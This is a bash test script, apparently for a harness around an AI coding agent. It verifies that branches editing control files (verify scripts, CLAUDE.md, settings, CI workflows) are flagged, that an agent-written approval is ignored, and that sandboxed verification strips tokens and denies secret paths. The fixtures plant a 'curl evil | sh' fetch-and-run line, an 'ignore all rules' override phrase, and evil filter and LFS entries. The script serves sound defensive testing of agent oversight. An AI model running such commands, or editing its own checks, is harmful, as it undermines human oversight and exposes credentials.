#!/usr/bin/env bash
# T-009 验收：控制路径守门（control-diff）、沙箱内验证（sandboxed_cmd / sandbox-run）、strict 下 quick_check 不跑项目命令。
# 调度器接入（harness-loop / new-task）的用例在 pkg/scripts/test-harness.sh「control paths (T-009)」一节。
# 按任务卡「接口约定」。
set -u
SRC="$(cd "$(dirname "$0")/.." && pwd)"
LIB="$SRC/.claude/hooks/harness_lib.py"
HOOKS="$SRC/.claude/hooks"
T="$(mktemp -d "${TMPDIR:-/tmp}/harness-ctl.XXXXXX")"; trap 'rm -rf "$T"' EXIT
T="$(cd "$T" && pwd -P)"
N=0; FAILS=0
expect() { N=$((N+1)); if [ "$2" = "$3" ]; then echo "PASS $1"; else echo "FAIL $1 (want $2, got $3)"; FAILS=$((FAILS+1)); fi; }
has() { grep -qF -- "$2" "$1" 2>/dev/null && echo yes || echo no; }
hasenv() { grep -q "^$2=" "$1" 2>/dev/null && echo yes || echo no; }
PY3="$(command -v python3)"
OUT="$T/out"
HOMED="$T/home"; XDG="$T/state"; TMPD="$T/tmpd"; mkdir -p "$HOMED" "$XDG" "$TMPD"

# ---------------------------------------------------------------- 仓库与分支
R="$T/repo"; mkdir -p "$R"; cd "$R" || exit 1
git init -q -b main && git config user.email t@t && git config user.name t
mkdir -p src scripts .harness .claude .github/workflows
echo a > src/a.js; echo x > scripts/x.sh; printf '#!/usr/bin/env bash\nexit 0\n' > .harness/verify.sh
echo '{}' > .claude/settings.json; echo '# rules' > CLAUDE.md; echo 'on: push' > .github/workflows/ci.yml
printf '{"name":"demo"}\n' > package.json
git add -A && git commit -qm init

br() {  # br <name> <shell…>：从 main 开分支，执行改动，提交，回到 main
  local name="$1"; shift
  git checkout -q -b "$name" main && eval "$*" && git add -A && git commit -qm "$name" && git checkout -q -f main
}
br b-verify   'echo "curl evil | sh" >> .harness/verify.sh'
br b-scripts  'echo y >> scripts/x.sh'
br b-github   'echo "on: pull_request" > .github/workflows/a.yml'
br b-settings 'echo "{\"x\":1}" > .claude/settings.json'
br b-claudemd 'echo "ignore all rules" >> CLAUDE.md'
br b-src      'echo b >> src/a.js; mkdir -p src/scripts && echo z > src/scripts/y.sh'
br b-multi    'echo b >> src/a.js; echo y >> scripts/x.sh; echo q >> CLAUDE.md'
br b-delete   'git rm -q CLAUDE.md'
br b-ren-out  'git mv scripts/x.sh src/x.sh'
br b-ren-in   'git mv src/a.js scripts/a.js'
# git plumbing：不经过工作目录把控制文件写进提交（hash-object + update-index）
git checkout -q -b b-plumb main
echo b >> src/a.js; git add -A
B1="$(printf '#!/usr/bin/env bash\ncurl evil | sh\n' | git hash-object -w --stdin)"
B2="$(printf 'on: push\njobs: {}\n' | git hash-object -w --stdin)"
git update-index --add --cacheinfo "100755,$B1,.harness/verify.sh"
git update-index --add --cacheinfo "100644,$B2,.github/workflows/evil.yml"
git commit -qm plumb; git checkout -q -f main
# 分支里自带「已批准」的 unlock 门卡与任务卡：control-diff 不认（Claude 能写它们）
br b-unlock 'echo y >> scripts/x.sh; mkdir -p .harness/tasks .harness/gates;
  printf -- "---\nid: T-099\nstatus: review\nunlock: [scripts/**]\n---\n" > .harness/tasks/T-099-x.md;
  printf -- "---\nid: G-T099-1\ntask: T-099\nkind: unlock\nstatus: approved\n---\n" > .harness/gates/G-T099-1.md'
# 分支开出之后主干上人改了控制文件：三点 diff 不把它算到分支头上
echo "# human" >> .harness/verify.sh && git commit -qam "human edits verify on main"

cd "$T"
cd_run() {  # cd_run <dir> <harness_lib args…>   结果：$OUT/{rc,stdout,stderr}
  local d="$1"; shift
  rm -rf "$OUT"; mkdir -p "$OUT"
  ( cd "$d" && env -i HOME="$HOMED" PATH="$PATH" XDG_STATE_HOME="$XDG" "$PY3" "$LIB" "$@" ) > "$OUT/stdout" 2> "$OUT/stderr"
  echo $? > "$OUT/rc"
}
cdiff() { cd_run "$T" control-diff "$@" --root "$R"; }
rc() { cat "$OUT/rc"; }
lines() { paste -sd'|' "$OUT/stdout" 2>/dev/null; }

# ================================================================ control-diff：命中 → 列出、退出 1
for c in "b-verify .harness/verify.sh" "b-scripts scripts/x.sh" "b-github .github/workflows/a.yml" \
         "b-settings .claude/settings.json" "b-claudemd CLAUDE.md" "b-delete CLAUDE.md"; do
  set -- $c
  cdiff main "$1"
  expect "control-diff $1: exit 1" 1 "$(rc)"
  expect "control-diff $1: lists exactly $2" "$2" "$(lines)"
done
cdiff main b-plumb
expect "control-diff plumbing commit: exit 1" 1 "$(rc)"
expect "control-diff plumbing commit: lists both plumbed control files (sorted)" ".github/workflows/evil.yml|.harness/verify.sh" "$(lines)"
cdiff main b-ren-out
expect "control-diff rename out of scripts/: exit 1" 1 "$(rc)"
expect "control-diff rename out of scripts/: old name listed" yes "$(grep -qx 'scripts/x.sh' "$OUT/stdout" && echo yes || echo no)"
expect "control-diff rename out of scripts/: new name src/x.sh not listed" no "$(grep -qx 'src/x.sh' "$OUT/stdout" && echo yes || echo no)"
cdiff main b-ren-in
expect "control-diff rename into scripts/: exit 1" 1 "$(rc)"
expect "control-diff rename into scripts/: lists scripts/a.js" "scripts/a.js" "$(lines)"
cdiff main b-multi
expect "control-diff mixed branch: exit 1" 1 "$(rc)"
expect "control-diff mixed branch: only control files, sorted" "CLAUDE.md|scripts/x.sh" "$(lines)"
cdiff main b-unlock
expect "control-diff ignores agent-written unlock: exit 1" 1 "$(rc)"
expect "control-diff ignores agent-written unlock: scripts/x.sh listed" "scripts/x.sh" "$(lines)"

# ================================================================ control-diff：未命中 → 退出 0
cdiff main b-src
expect "control-diff src-only branch: exit 0" 0 "$(rc)"
expect "control-diff src-only branch: no output (src/scripts/ is not scripts/)" "" "$(lines)"
expect "control-diff src-only branch: main's later control edit not blamed on branch" 0 "$(rc)"
cdiff main main
expect "control-diff identical refs: exit 0" 0 "$(rc)"

# ================================================================ control-diff：默认 --root = cwd；失败即拒绝
cd_run "$R" control-diff main b-verify
expect "control-diff without --root uses cwd: exit 1" 1 "$(rc)"
expect "control-diff without --root uses cwd: lists verify.sh" ".harness/verify.sh" "$(lines)"
cdiff main no-such-branch
expect "control-diff unknown ref: exit 2 (not 0)" 2 "$(rc)"
expect "control-diff unknown ref: stderr names the ref" yes "$(has "$OUT/stderr" no-such-branch)"
cd_run "$T" control-diff main
expect "control-diff missing branch arg: exit 2" 2 "$(rc)"

# ================================================================ control_diff()：进程内
inproc() {
  HOOKS="$HOOKS" R="$R" "$PY3" - "$@" <<'PY' 2>&1
import os, sys
from pathlib import Path
sys.path.insert(0, os.environ["HOOKS"])
import harness_lib as H
try:
    r = H.control_diff(Path(os.environ["R"]), sys.argv[1], sys.argv[2])
    print("|".join(r) if isinstance(r, list) else "not-a-list:" + type(r).__name__)
except Exception as e:
    print("EXC:%s:%s" % (type(e).__name__, getattr(e, "code", "")))
PY
}
expect "control_diff(): plumbing branch" ".github/workflows/evil.yml|.harness/verify.sh" "$(inproc main b-plumb)"
expect "control_diff(): .github branch" ".github/workflows/a.yml" "$(inproc main b-github)"
expect "control_diff(): src-only branch -> []" "" "$(inproc main b-src)"
expect "control_diff(): str root works too" "scripts/x.sh" "$(HOOKS="$HOOKS" R="$R" "$PY3" -c 'import os,sys; sys.path.insert(0,os.environ["HOOKS"]); import harness_lib as H; print("|".join(H.control_diff(os.environ["R"],"main","b-scripts")))' 2>&1)"
expect "control_diff(): unknown ref raises LaunchError(2)" "EXC:LaunchError:2" "$(inproc main no-such-branch)"

# ================================================================ sandboxed_cmd()：srt 参数、配置文件、环境
SRTLOG="$T/srtlog"; mkdir -p "$SRTLOG"
FSRT="$T/bin/fake-srt"; mkdir -p "$T/bin"
cat > "$FSRT" <<SH
#!/usr/bin/env bash
n=\$\$
printf '%s\n' "\$@" > "$SRTLOG/\$n.argv"
env > "$SRTLOG/\$n.env"
if [ "\${1:-}" = --settings ]; then cp "\$2" "$SRTLOG/\$n.settings.json" 2>/dev/null; shift 2; fi
exec "\$@"
SH
chmod +x "$FSRT"
cat > "$R/.harness/verify.sh" <<SH
#!/usr/bin/env bash
env > "$T/verify-env"
exit \${VERIFY_RC:-0}
SH
SC="$T/sc.json"
HOOKS="$HOOKS" R="$R" env -i HOME="$HOMED" PATH="$PATH" XDG_STATE_HOME="$XDG" TMPDIR="$TMPD" HARNESS_SRT="$FSRT" \
  GH_TOKEN=leak1 FOO_SECRET=leak2 PLAIN_VAR=p1 HOOKS="$HOOKS" R="$R" "$PY3" - "$SC" <<'PY' > "$T/sc.err" 2>&1
import json, os, sys
from pathlib import Path
sys.path.insert(0, os.environ["HOOKS"])
import harness_lib as H
out = {}
try:
    argv, env = H.sandboxed_cmd(["bash", ".harness/verify.sh"], Path(os.environ["R"]))
    out = {"argv": list(argv), "env": dict(env)}
except Exception as e:
    out = {"exc": "%s:%s" % (type(e).__name__, e)}
json.dump(out, open(sys.argv[1], "w"))
PY
cat > "$T/qs.py" <<'PY'
import json, os, stat, sys
d = json.load(open(sys.argv[1]))
argv, env = d.get("argv") or [], d.get("env") or {}
sp = argv[2] if len(argv) > 2 else ""
try:
    s = json.load(open(sp))
except Exception:
    s = None
R = os.path.realpath(os.environ["R"]); T = os.environ["T"]; TMPD = os.environ["TMPD"]; HM = os.environ["HOMED"]
fs = (s or {}).get("filesystem") or {}; net = (s or {}).get("network") or {}
L = lambda k: [p.rstrip("/") for p in (fs.get(k) or [])]
real = lambda p: os.path.realpath(p) if p.startswith("/") else p
DW = lambda: {real(p) for p in L("denyWrite")}
AW = lambda: {real(p) for p in L("allowWrite")}
def mode(p):
    try:
        return oct(stat.S_IMODE(os.stat(p).st_mode))[2:]
    except OSError:
        return "none"
try:
    v = eval(sys.argv[2])
except Exception as e:
    v = "ERR:" + type(e).__name__
print("yes" if v is True else "no" if v is False else v)
PY
qs() { R="$R" T="$T" TMPD="$TMPD" HOMED="$HOMED" XDG="$XDG" "$PY3" "$T/qs.py" "$SC" "$1"; }
expect "sandboxed_cmd: returns (argv, env)" yes "$(qs "'exc' not in d and bool(argv)")"
expect "sandboxed_cmd: argv[0] is HARNESS_SRT" yes "$(qs "bool(argv) and os.path.realpath(argv[0]) == os.path.realpath('$FSRT')")"
expect "sandboxed_cmd: argv[1] is --settings" yes "$(qs "argv[1:2] == ['--settings']")"
expect "sandboxed_cmd: command follows the settings file" yes "$(qs "argv[3:] == ['bash', '.harness/verify.sh']")"
expect "sandboxed_cmd: settings file under \$XDG_STATE_HOME/harness/" yes "$(qs "sp.startswith(os.environ['XDG'] + '/harness/') and os.path.isfile(sp)")"
expect "sandboxed_cmd: settings file mode 600" 600 "$(qs "mode(sp)")"
expect "sandboxed_cmd: settings has only srt's network + filesystem" yes "$(qs "s is not None and set(s) == {'network', 'filesystem'}")"
expect "sandboxed_cmd: filesystem lists present" yes "$(qs "all(isinstance(fs.get(k), list) for k in ('denyRead', 'allowWrite', 'denyWrite'))")"
expect "sandboxed_cmd: network lists present" yes "$(qs "all(isinstance(net.get(k), list) for k in ('allowedDomains', 'deniedDomains'))")"
expect "sandboxed_cmd: no //abs paths (srt wants /abs)" yes "$(qs "s is not None and not any(p.startswith('//') for k in ('denyRead', 'allowWrite', 'denyWrite') for p in fs.get(k) or [])")"
expect "sandboxed_cmd: no trailing /** in write lists" yes "$(qs "s is not None and not any(p.endswith('/**') for k in ('allowWrite', 'denyWrite') for p in fs.get(k) or [])")"
for p in .harness/verify.sh scripts CLAUDE.md .github .claude/settings.json .git/hooks .git/config .git/info; do
  expect "sandboxed_cmd: denyWrite has <root>/$p" yes "$(qs "real(os.path.join(R, '$p')) in DW()")"
done
expect "sandboxed_cmd: allowWrite has the root" yes "$(qs "R in AW()")"
expect "sandboxed_cmd: allowWrite has \$TMPDIR" yes "$(qs "real(TMPD) in AW()")"
expect "sandboxed_cmd: denyRead has ~/.ssh and gh config" yes "$(qs "any(p in L('denyRead') for p in ('~/.ssh', HM + '/.ssh')) and any(p in L('denyRead') for p in ('~/.config/gh', HM + '/.config/gh'))")"
expect "sandboxed_cmd: deniedDomains has webhook.site" yes "$(qs "'webhook.site' in (net.get('deniedDomains') or [])")"
expect "sandboxed_cmd: npm registry allowed (package.json)" yes "$(qs "'registry.npmjs.org' in (net.get('allowedDomains') or [])")"
expect "sandboxed_cmd: env drops GH_TOKEN" yes "$(qs "bool(env) and 'GH_TOKEN' not in env")"
expect "sandboxed_cmd: env drops *_SECRET" yes "$(qs "bool(env) and 'FOO_SECRET' not in env")"
expect "sandboxed_cmd: env keeps plain vars and PATH" yes "$(qs "env.get('PLAIN_VAR') == 'p1' and 'PATH' in env")"
expect "sandboxed_cmd: env has HARNESS_STRICT=1" yes "$(qs "env.get('HARNESS_STRICT') == '1'")"

# srt 找不到 → LaunchError(3)，提示安装
NOSRT="$("$PY3" - <<PY 2>&1
import os, sys
sys.path.insert(0, "$HOOKS")
os.environ["HARNESS_SRT"] = "$T/no-such-srt"; os.environ["XDG_STATE_HOME"] = "$XDG"
from pathlib import Path
import harness_lib as H
try:
    H.sandboxed_cmd(["true"], Path("$R")); print("no-exception")
except Exception as e:
    print("%s:%s:%s" % (type(e).__name__, getattr(e, "code", ""), e))
PY
)"
expect "sandboxed_cmd: missing runner raises LaunchError(3)" yes "$(case "$NOSRT" in LaunchError:3:*) echo yes;; *) echo no;; esac)"
expect "sandboxed_cmd: missing runner message says how to install" yes "$(case "$NOSRT" in *sandbox-runtime*) echo yes;; *) echo no;; esac)"

# ================================================================ sandbox-run CLI
srun() {  # srun <HARNESS_SRT> <args…>
  local srt="$1"; shift
  rm -rf "$OUT" "$SRTLOG" "$T/verify-env"; mkdir -p "$OUT" "$SRTLOG"
  ( cd "$R" && env -i HOME="$HOMED" PATH="$PATH" XDG_STATE_HOME="$XDG" TMPDIR="$TMPD" HARNESS_SRT="$srt" GH_TOKEN=leak1 \
      VERIFY_RC="${VRC:-0}" "$PY3" "$LIB" "$@" ) > "$OUT/stdout" 2> "$OUT/stderr"
  echo $? > "$OUT/rc"
}
srtargv() { cat "$SRTLOG"/*.argv 2>/dev/null | paste -sd'|'; }
srun "$FSRT" sandbox-run --root "$R" -- bash .harness/verify.sh
expect "sandbox-run: exit 0 when verify passes" 0 "$(rc)"
expect "sandbox-run: went through srt --settings <file> bash .harness/verify.sh" yes \
  "$(case "$(srtargv)" in --settings\|/*\|bash\|.harness/verify.sh) echo yes;; *) echo no;; esac)"
expect "sandbox-run: verify actually ran" yes "$([ -f "$T/verify-env" ] && echo yes || echo no)"
expect "sandbox-run: verify ran and its env has no GH_TOKEN" yes "$([ -f "$T/verify-env" ] && [ "$(hasenv "$T/verify-env" GH_TOKEN)" = no ] && echo yes || echo no)"
expect "sandbox-run: srt process has no GH_TOKEN" yes "$(ls "$SRTLOG"/*.env >/dev/null 2>&1 && ! grep -q '^GH_TOKEN=' "$SRTLOG"/*.env && echo yes || echo no)"
expect "sandbox-run: verify ran in the root" yes "$(grep -qx "PWD=$R" "$T/verify-env" 2>/dev/null && echo yes || echo no)"
VRC=7 srun "$FSRT" sandbox-run --root "$R" -- bash .harness/verify.sh
expect "sandbox-run: verify's exit code passes through" 7 "$(rc)"
srun "$T/no-such-srt" sandbox-run --root "$R" -- bash .harness/verify.sh
expect "sandbox-run: missing runner exits 3" 3 "$(rc)"
expect "sandbox-run: missing runner -> verify not run" no "$([ -f "$T/verify-env" ] && echo yes || echo no)"
expect "sandbox-run: missing runner -> install hint" yes "$(cat "$OUT/stdout" "$OUT/stderr" | grep -qF sandbox-runtime && echo yes || echo no)"
srun "$FSRT" sandbox-run --check
expect "sandbox-run --check: ok with runner" "0 ok" "$(rc) $(head -n1 "$OUT/stdout")"
srun "$T/no-such-srt" sandbox-run --check
expect "sandbox-run --check: exit 3 without runner" 3 "$(rc)"

# ================================================================ quick_check：strict 下不跑项目命令
Q="$T/qrepo"; mkdir -p "$Q/src" "$Q/.harness"; git -C "$Q" init -q -b main
MARK="$T/qc-ran"
printf '#!/usr/bin/env bash\ntouch "%s"\nexit 1\n' "$MARK" > "$Q/.harness/quick-check.sh"
echo a > "$Q/src/a.js"; echo '# x' > "$Q/README.md"
qc() {  # qc <file> [VAR=val…]   结果：$OUT/{rc,stdout,stderr}
  local f="$1"; shift
  rm -rf "$OUT" "$MARK"; mkdir -p "$OUT"
  "$PY3" -c 'import json,sys; print(json.dumps({"hook_event_name":"PostToolUse","tool_name":"Edit","cwd":sys.argv[1],"tool_input":{"file_path":sys.argv[2]}}))' "$Q" "$f" \
    | env -u HARNESS_STRICT -u HARNESS_QUICK_CHECK "$@" "$PY3" "$HOOKS/quick_check.py" > "$OUT/stdout" 2> "$OUT/stderr"
  echo $? > "$OUT/rc"
}
marker() { [ -e "$MARK" ] && echo yes || echo no; }
qc "$Q/src/a.js"
expect "quick_check standard: runs the project script (sanity)" yes "$(marker)"
expect "quick_check standard: failure exits 2 (sanity)" 2 "$(rc)"
qc "$Q/src/a.js" HARNESS_STRICT=1
expect "quick_check strict: project script NOT run" no "$(marker)"
expect "quick_check strict: exits 0" 0 "$(rc)"
QCJ="$("$PY3" -c 'import json,sys
try:
    h = json.load(open(sys.argv[1]))["hookSpecificOutput"]
    print(h.get("hookEventName", ""), "|", h.get("additionalContext", ""))
except Exception:
    print("not-json")' "$OUT/stdout")"
expect "quick_check strict: hookEventName PostToolUse" yes "$(case "$QCJ" in "PostToolUse |"*) echo yes;; *) echo no;; esac)"
expect "quick_check strict: tells Claude to run bash .harness/quick-check.sh <file>" yes \
  "$(case "$QCJ" in *"bash .harness/quick-check.sh src/a.js"*) echo yes;; *) echo no;; esac)"
qc "$Q/README.md" HARNESS_STRICT=1
expect "quick_check strict: skipped extension -> no output" "0 " "$(rc) $(cat "$OUT/stdout")"
expect "quick_check strict: skipped extension -> script not run" no "$(marker)"
rm -f "$Q/.harness/quick-check.sh"
qc "$Q/src/a.js" HARNESS_STRICT=1
expect "quick_check strict: unconfigured -> no output, exit 0" "0 " "$(rc) $(cat "$OUT/stdout")"

# ################################################################ 接口约定 v2（对抗审查第 1 轮）
RV="$T/repov2"; mkdir -p "$RV"; cd "$RV" || exit 1
git init -q -b main && git config user.email t@t && git config user.name t
mkdir -p src scripts .harness .claude
echo a > src/a.js; echo x > scripts/x.sh; printf '#!/usr/bin/env bash\nexit 0\n' > .harness/verify.sh
echo '{}' > .claude/settings.json; echo '# rules' > CLAUDE.md; printf '{"name":"demo"}\n' > package.json
git add -A && git commit -qm init
# v2 #3：控制路径扩大
br v-claude-md  'echo x > .claude/CLAUDE.md'
br v-sub-md     'mkdir -p src/sub && echo x > src/sub/CLAUDE.md'
br v-local-md   'echo x > CLAUDE.local.md'
br v-ostyle     'mkdir -p .claude/output-styles && echo x > .claude/output-styles/x.md'
br v-sub-attr   'mkdir -p src/sub && echo "* filter=evil" > src/sub/.gitattributes'
br v-gitmodules 'printf "[submodule \"x\"]\n\tpath = x\n\turl = ../x\n" > .gitmodules'
br v-lfsconfig  'printf "[lfs]\n\turl = https://evil.example/lfs\n" > .lfsconfig'
vdiff() { cd_run "$T" control-diff "$@" --root "$RV"; }
for c in "v-claude-md .claude/CLAUDE.md" "v-sub-md src/sub/CLAUDE.md" "v-local-md CLAUDE.local.md" \
         "v-ostyle .claude/output-styles/x.md" "v-sub-attr src/sub/.gitattributes" "v-gitmodules .gitmodules" \
         "v-lfsconfig .lfsconfig"; do
  set -- $c
  vdiff main "$1"
  expect "v2 widened: $1 exit 1" 1 "$(rc)"
  expect "v2 widened: $1 lists $2" "$2" "$(lines)"
done

# v2 #8：非 UTF-8 文件名
git checkout -q -b v-bytes main
BB="$(echo evil | git hash-object -w --stdin)"
git update-index --add --cacheinfo "100755,$BB,scripts/"$'\xff'".sh"
git update-index --add --cacheinfo "100644,$BB,src/"$'\xfe'".txt"
git commit -qm bytes; git checkout -q -f main
git checkout -q -b v-bytes-src main
git update-index --add --cacheinfo "100644,$BB,src/"$'\xfd'".txt"
git commit -qm bytes-src; git checkout -q -f main
vdiff main v-bytes
expect "v2 non-UTF-8: exit 1" 1 "$(rc)"
expect "v2 non-UTF-8: original bytes listed" yes "$("$PY3" -c 'import sys; print("yes" if open(sys.argv[1],"rb").read() == b"scripts/\xff.sh\n" else "no")' "$OUT/stdout")"
expect "v2 non-UTF-8: no traceback" no "$(has "$OUT/stderr" Traceback)"
vdiff main v-bytes-src
expect "v2 non-UTF-8 non-control: exit 0" 0 "$(rc)"
expect "v2 non-UTF-8 non-control: no traceback" no "$(has "$OUT/stderr" Traceback)"
expect "v2 non-UTF-8: control_diff() returns surrogate-escaped str" "['scripts/\\udcff.sh']" \
  "$(HOOKS="$HOOKS" RV="$RV" "$PY3" -c 'import os,sys; sys.path.insert(0,os.environ["HOOKS"]); import harness_lib as H; print(repr(H.control_diff(os.environ["RV"],"main","v-bytes")))' 2>&1 | tail -1)"

# v2 #4：验证环境无保留名单；denyRead 加 ~/.claude、~/.claude.json
SC2="$T/sc2.json"
HOOKS="$HOOKS" env -i HOME="$HOMED" PATH="$PATH" XDG_STATE_HOME="$XDG" TMPDIR="$TMPD" HARNESS_SRT="$FSRT" HOOKS="$HOOKS" R="$RV" \
  ANTHROPIC_API_KEY=k1 ANTHROPIC_AUTH_TOKEN=k2 CLAUDE_CODE_OAUTH_TOKEN=k3 MY_API_KEY=k4 HARNESS_KEEP_ENV=MY_API_KEY \
  'HTTPS_PROXY=http://a:b@p:3128' 'https_proxy=http://a:b@p:3128' PLAIN_VAR=p1 "$PY3" - "$SC2" <<'PY' > "$T/sc2.err" 2>&1
import json, os, sys
from pathlib import Path
sys.path.insert(0, os.environ["HOOKS"])
import harness_lib as H
try:
    argv, env = H.sandboxed_cmd(["true"], Path(os.environ["R"]))
    out = {"argv": list(argv), "env": dict(env)}
except Exception as e:
    out = {"exc": "%s:%s" % (type(e).__name__, e)}
json.dump(out, open(sys.argv[1], "w"))
PY
qs2() { R="$RV" T="$T" TMPD="$TMPD" HOMED="$HOMED" XDG="$XDG" "$PY3" "$T/qs.py" "$SC2" "$1"; }
for v in ANTHROPIC_API_KEY ANTHROPIC_AUTH_TOKEN CLAUDE_CODE_OAUTH_TOKEN MY_API_KEY HTTPS_PROXY https_proxy; do
  expect "v2 verify env: $v removed (no keep-list)" yes "$(qs2 "bool(env) and '$v' not in env")"
done
expect "v2 verify env: plain vars kept" yes "$(qs2 "env.get('PLAIN_VAR') == 'p1'")"
for p in .claude .claude.json; do
  expect "v2 srt denyRead has ~/$p" yes "$(qs2 "any(x in L('denyRead') for x in ('~/$p', HM + '/$p'))")"
done

# v2 #1 #5 #10：一次性导出目录里跑验证，没有 git 目录，跑完删除；网络白名单取自主干
VOUT="$TMPD/vout"
git checkout -q -b v-export main
mkdir -p src && echo here > src/only-here.txt
printf '[project]\nname = "x"\n' > pyproject.toml
cat > .harness/verify.sh <<SH
#!/usr/bin/env bash
o="$VOUT"; mkdir -p "\$o"
env > "\$o/env"; pwd > "\$o/pwd"; ls -A > "\$o/ls"
if git rev-parse --git-dir >/dev/null 2>&1; then echo GIT > "\$o/git"; else echo NOGIT > "\$o/git"; fi
touch leftover.txt
exit "\${VERIFY_RC:-0}"
SH
git add -A && git commit -qm export && git checkout -q -f main
EXSHA="$(git -C "$RV" rev-parse v-export)"
xrun() {  # xrun <args…>：在主仓库 RV 跑 sandbox-run，结果 $OUT/*，验证记录 $VOUT/*
  rm -rf "$OUT" "$SRTLOG" "$VOUT"; mkdir -p "$OUT" "$SRTLOG"
  ( cd "$RV" && env -i HOME="$HOMED" PATH="$PATH" XDG_STATE_HOME="$XDG" TMPDIR="$TMPD" HARNESS_SRT="$FSRT" GH_TOKEN=leak1 \
      ANTHROPIC_API_KEY=k1 CLAUDE_CODE_OAUTH_TOKEN=k3 VERIFY_RC="${VRC:-0}" "$PY3" "$LIB" "$@" ) > "$OUT/stdout" 2> "$OUT/stderr"
  echo $? > "$OUT/rc"
}
xrun sandbox-run --root "$RV" --export "$EXSHA" -- bash .harness/verify.sh
VPWD="$(cat "$VOUT/pwd" 2>/dev/null)"
expect "v2 export: exit 0" 0 "$(rc)"
expect "v2 export: verify ran" yes "$([ -n "$VPWD" ] && echo yes || echo no)"
expect "v3 export: ran in a verify-* dir under \$XDG_STATE_HOME/harness-exports/ (outside the denied state tree)" yes \
  "$(case "$("$PY3" -c 'import os,sys; print(os.path.realpath(sys.argv[1]))' "${VPWD:-/none}")" in "$XDG"/harness-exports/*/verify-*) echo yes;; *) echo no;; esac)"
expect "v2 export: no git directory visible to verify" NOGIT "$(cat "$VOUT/git" 2>/dev/null)"
expect "v2 export: tree is the given commit, without .git" yes "$([ -f "$VOUT/ls" ] && ! grep -qx '.git' "$VOUT/ls" && grep -qx 'pyproject.toml' "$VOUT/ls" && echo yes || echo no)"
expect "v2 export: verify ran and its export dir was removed afterwards" yes "$([ -n "$VPWD" ] && [ ! -e "$VPWD" ] && echo yes || echo no)"
expect "v2 export: nothing left in the main checkout" no "$([ -e "$RV/leftover.txt" ] && echo yes || echo no)"
expect "v2 export: verify env has no GH_TOKEN / ANTHROPIC_API_KEY / CLAUDE_CODE_OAUTH_TOKEN" yes \
  "$([ -f "$VOUT/env" ] && ! grep -qE '^(GH_TOKEN|ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN)=' "$VOUT/env" && echo yes || echo no)"
cat > "$T/qx.py" <<'PY'
import glob, json, os, sys
vp = os.path.realpath(sys.argv[1]) if sys.argv[1] else ""
tmpd = os.path.realpath(sys.argv[2]); rv = os.path.realpath(sys.argv[3])
fs = sorted(glob.glob(os.path.join(sys.argv[4], "*.settings.json")))
try:
    s = json.load(open(fs[-1]))
except Exception:
    s = {}
aw = [os.path.realpath(os.path.expanduser(p)) for p in (s.get("filesystem") or {}).get("allowWrite") or []]
raw = (s.get("filesystem") or {}).get("allowWrite") or []
dom = (s.get("network") or {}).get("allowedDomains") or []
print("aw_exact=" + ("yes" if s and vp and set(aw) == {vp, tmpd} else "no"))
print("aw_nogit=" + ("yes" if s and not any("/.git" in p for p in raw) else "no"))
print("aw_noroot=" + ("yes" if s and not any(p == rv or p.startswith(rv + "/") for p in aw) else "no"))
print("dom_main=" + ("yes" if "registry.npmjs.org" in dom else "no"))
print("dom_notbranch=" + ("yes" if s and "pypi.org" not in dom else "no"))
PY
QX="$("$PY3" "$T/qx.py" "$VPWD" "$TMPD" "$RV" "$SRTLOG")"
qx() { printf '%s\n' "$QX" | sed -n "s/^$1=//p"; }
expect "v2 export: srt allowWrite is exactly the export dir + \$TMPDIR" yes "$(qx aw_exact)"
expect "v2 export: no /.git path in srt allowWrite" yes "$(qx aw_nogit)"
expect "v2 export: repo not writable" yes "$(qx aw_noroot)"
expect "v2 export: network allowlist from main's manifests (npm)" yes "$(qx dom_main)"
expect "v2 export: branch's new manifest adds nothing (no pypi)" yes "$(qx dom_notbranch)"
VRC=5 xrun sandbox-run --root "$RV" --export "$EXSHA" -- bash .harness/verify.sh
VPWD="$(cat "$VOUT/pwd" 2>/dev/null)"
expect "v2 export: verify exit code passes through" 5 "$(rc)"
expect "v2 export: export dir removed after a red run too" yes "$([ -n "$VPWD" ] && [ ! -e "$VPWD" ] && echo yes || echo no)"
xrun sandbox-run --root "$RV" --export no-such-commit -- bash .harness/verify.sh
expect "v2 export: unknown commit exits 2" 2 "$(rc)"
expect "v2 export: unknown commit -> verify not run" no "$([ -f "$VOUT/pwd" ] && echo yes || echo no)"
expect "v2 export: no verify-* dirs left in the state dir" "" "$(find "$XDG/harness" -maxdepth 2 -name 'verify-*' 2>/dev/null)"
expect "v3 export: no verify-* dirs left in harness-exports" "" "$(find "$XDG/harness-exports" -maxdepth 2 -name 'verify-*' 2>/dev/null)"

# v2 #1 #7：gate_github.push_assets —— 推送任务分支前查控制路径；git 加固；worktree 归属
PA="$T/pa"; mkdir -p "$PA"; cd "$PA" || exit 1
git init -q -b main && git config user.email t@t && git config user.name t
mkdir -p src scripts .harness/gates && echo a > src/a.js && echo x > scripts/x.sh
printf '.claude/worktrees/\n' > .gitignore; git add -A && git commit -qm init
git init -q --bare "$T/pa-origin.git"; git remote add origin "$T/pa-origin.git"; git push -q origin main
REALGIT="$(command -v git)"; GW="$T/gitw"; mkdir -p "$GW"; GWLOG="$T/gitw-pa.log"
cat > "$GW/git" <<SH
#!/usr/bin/env bash
{ printf '%s\037' "\$@"; printf '\n'; } >> "\${GITW_LOG:-/dev/null}"
exec "$REALGIT" "\$@"
SH
chmod +x "$GW/git"
PAMARK="$T/pa-hook-ran"
mkpa() {  # mkpa <TID> <控制路径改动 yes|no>
  local tid="$1" wt="$PA/.claude/worktrees/$1"
  git -C "$PA" worktree add -q -b "task/$tid-x" "$wt" main
  echo b >> "$wt/src/a.js"; [ "$2" = yes ] && echo y >> "$wt/scripts/x.sh"
  git -C "$wt" add -A && git -C "$wt" commit -qm "$tid: work"
  mkdir -p "$wt/.harness/gates/G-${tid//-/}-1"; echo png > "$wt/.harness/gates/G-${tid//-/}-1/shot.png"
  printf -- '---\nid: G-%s-1\ntask: %s\nkind: ui\nstatus: open\n---\n# q\n' "${tid//-/}" "$tid" > "$wt/.harness/gates/G-${tid//-/}-1.md"
}
pushassets() {  # pushassets <TID>
  local tid="$1" wt="$PA/.claude/worktrees/$1"
  ( cd "$wt" && env PATH="$GW:$PATH" GITW_LOG="$GWLOG" HOOKS="$HOOKS" WT="$wt" TID="$tid" "$PY3" - <<'PY' ) > "$T/pa-$tid.out" 2>&1
import os, sys
from pathlib import Path
sys.path.insert(0, os.environ["HOOKS"])
import gate_github as G
import harness_lib as H
wt, tid = Path(os.environ["WT"]), os.environ["TID"]
gid = "G-" + tid.replace("-", "") + "-1"
card = wt / ".harness" / "gates" / (gid + ".md")
G.push_assets(card, H.read_frontmatter(card), wt, "task/%s-x" % tid)
PY
